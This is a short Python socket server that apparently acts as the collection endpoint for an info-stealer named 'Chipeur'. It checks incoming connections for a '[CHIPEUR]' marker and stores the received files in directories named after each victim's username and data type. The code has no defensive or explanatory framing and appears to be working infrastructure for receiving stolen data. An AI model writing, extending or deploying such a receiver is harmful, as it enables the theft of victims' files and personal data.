import socket
import os
import time

def savefile(username: str, datatype: str, filename: str, client: socket.socket):
    try :
        os.mkdir(username)
    except FileExistsError:
        print(f"DEBUG: {username} directory already exists.")
    except:
        print(f"DEBUG: Error while creating the {username} directory. Abort")
        return
    
    path = username + "/" + datatype
    try :
        os.mkdir(path)
    except FileExistsError:
        print(f"DEBUG: {path} directory already exists.")
    except:
        print(f"DEBUG: Error while creating the {path} directory. Abort")
        return

    path: str = username + "/" + datatype + "/" + str(int(time.time())) + "_" + filename
    fic = open(path, "w")
    ch = client.recv(9).decode("utf-8")
    while ch[-9:] != "[RUEPIHC]":
        try:
            cur_c = client.recv(1).decode("utf-8")
            ch += cur_c
        except:
            fic.write(ch)
            fic.close()
    ch = ch[:-9]
    print(f"DEBUG: Writing '{path}' file")
    fic.write(ch)
    fic.close()



def read_until_next_pipe_UTF16(client: socket.socket):
    ch = ""
    cur_c = ""
    attempt = 0
    while cur_c != "|":
        try:
            recv = client.recv(2)
            cur_c = recv.decode("utf-16")
            ch += cur_c
            attempt = 0
        except UnicodeDecodeError:
            print("DEBUG: read_until_next_pipe_UTF16: UnicodeDecodeError: skipping")
            time.sleep(2)
            attempt += 1
            if attempt == 3:
                print("DEBUG: read_until_next_pipe_UTF16: 3rd time reading fails: exiting")
                raise TimeoutError
    return ch[:-1]

def start_server(host='0.0.0.0', port=1234):
    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to the address and port
    server_socket.bind((host, port))

    # Listen for incoming connections
    server_socket.listen(1)
    print(f"Listening on {host}:{port}...")

    while True:
        # Accept a connection
        client_socket, addr = server_socket.accept()
        print(f"Connection from {addr}")

        try:
            while True:
                chipeur = read_until_next_pipe_UTF16(client_socket)
                print(chipeur)
                if "[CHIPEUR]" not in chipeur:
                    print("pas chipeur")
                    client_socket.close()
                    break

                username = read_until_next_pipe_UTF16(client_socket)

                datatype = read_until_next_pipe_UTF16(client_socket)

                if datatype == "file":
                    filename = read_until_next_pipe_UTF16(client_socket)
                    savefile(username, datatype, filename, client_socket)
        except ConnectionResetError as error:
            print(f"DEBUG: Connection closed: {error}")
        except TimeoutError as error:
            print(f"DEBUG: Connection closed: {error}")
            client_socket.close()

if __name__ == "__main__":
    start_server()
